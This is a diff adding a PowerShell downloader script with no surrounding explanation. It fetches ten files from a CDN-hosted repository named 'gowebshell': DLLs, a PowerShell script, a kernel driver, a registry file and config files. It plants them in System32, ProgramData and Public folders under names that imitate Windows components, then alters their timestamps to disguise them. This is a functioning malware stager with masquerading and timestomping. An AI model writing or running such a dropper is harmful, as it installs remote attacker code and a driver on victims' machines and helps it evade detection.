@@ -1,0 +1,80 @@
+$ErrorActionPreference = "Stop"
+
+$fileList = @(
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/x64.dll"
+        OutputPath = "C:\ProgramData\Microsoft\mscorst64.dll"
+        CreationTime = [DateTime]::Parse("2016-07-16 21:18:00")
+        ModificationTime = [DateTime]::Parse("2016-07-16 21:18:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/x86.dll"
+        OutputPath = "C:\ProgramData\Microsoft\mscorst.dll"
+        CreationTime = [DateTime]::Parse("2016-07-17 10:30:00")
+        ModificationTime = [DateTime]::Parse("2016-07-17 10:30:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/JKexec.ps1"
+        OutputPath = "C:\ProgramData\Microsoft\win.ps1"
+        CreationTime = [DateTime]::Parse("2016-07-17 10:30:00")
+        ModificationTime = [DateTime]::Parse("2016-07-17 10:30:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/infocard.dll"
+        OutputPath = "C:\Windows\System32\infocard.dll"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/diagsvc.sys"
+        OutputPath = "C:\Windows\System32\drivers\diagsvc.sys"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/4.txt"
+        OutputPath = "C:\Users\Public\4.reg"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/app.ini"
+        OutputPath = "C:\Users\Public\Documents\EFL\app.ini"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/rule.dat"
+        OutputPath = "C:\Users\Public\Documents\EFL\rule.dat"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/rule.ini"
+        OutputPath = "C:\Users\Public\Documents\EFL\rule.ini"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    },
+    @{
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/user.dat"
+        OutputPath = "C:\Users\Public\Documents\EFL\user.dat"
+        CreationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+        ModificationTime = [DateTime]::Parse("2016-07-18 14:45:00")
+    }
+)
+
+foreach ($fileInfo in $fileList) {
+    $outputDirectory = [System.IO.Path]::GetDirectoryName($fileInfo.OutputPath)
+    if (-not (Test-Path -Path $outputDirectory)) {
+        New-Item -Path $outputDirectory -ItemType Directory -Force
+    }
+
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($fileInfo.Url, $fileInfo.OutputPath)
+
+    $fileInfo = Get-Item -Path $fileInfo.OutputPath
+    $fileInfo.CreationTime = $fileInfo.CreationTime.AddYears(2)
+    $fileInfo.LastWriteTime = $fileInfo.LastWriteTime.AddYears(2)
+}
+
+$ErrorActionPreference = "Continue"
